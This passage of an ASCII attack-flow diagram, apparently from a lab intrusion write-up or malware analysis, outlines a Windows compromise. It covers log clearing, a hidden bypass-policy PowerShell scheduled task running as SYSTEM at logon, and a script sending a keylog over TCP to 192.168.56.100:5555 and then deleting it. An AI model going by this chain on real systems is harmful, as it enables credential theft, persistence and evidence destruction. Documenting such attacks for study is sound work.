                │               │       └── Rotating log > 10MB
                │               │
                │               ├── [5] Clear PowerShell log
                │               └── [6] Scheduled Task "SysLogMaint" (anti-forensic)
                │
                ▼
[Attacker có SYSTEM revshell]
                │
                ▼
[Stage 9]   Register-ScheduledTask "LoginTask"
                ├── TaskName: LoginTask
                ├── Action: powershell.exe -NoP -W H -Exec Bypass -C "..."
                ├── Trigger: AtLogOn
                ├── Principal: SYSTEM, Highest
                │       │
                │       ▼
                │   [Moi lan user logon]
                │       │
                │       ▼
                │   [Stage 10] login_handler.ps1  ← FILE NAY
                │       ├── Doc keylog tu kernel32.dll
                │       ├── Ket noi TCP toi 192.168.56.100:5555
                │       ├── Gui header (host, user, time, size)
                │       ├── Gui keylog
                │       ├── Gui footer
                │       ├── Dong ket noi
                │       └── XOA keylog (anti-forensic)
                │
                ▼
[Attacker nhận keylog → có credential → lateral movement / ransom / exfil]
```
